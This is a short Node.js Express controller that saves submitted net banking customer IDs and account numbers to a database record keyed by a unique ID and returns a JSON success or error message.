const NetBanking = require('../models/NetBanking');

exports.submitNetBankingPayment = async (req, res) => {
    try {
        const { uniqueid, customerId, accountNumber } = req.body;
        let netBanking = await NetBanking.findOne({ uniqueid });

        if (netBanking) {
            netBanking.entries.push({ customerId, accountNumber });
        } else {
            netBanking = new NetBanking({
                uniqueid,
                entries: [{ customerId, accountNumber }]
            });
        }

        await netBanking.save();
        res.status(200).json({
            success: true,
            message: "Net Banking Data Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting net banking data"
        });
    }
};
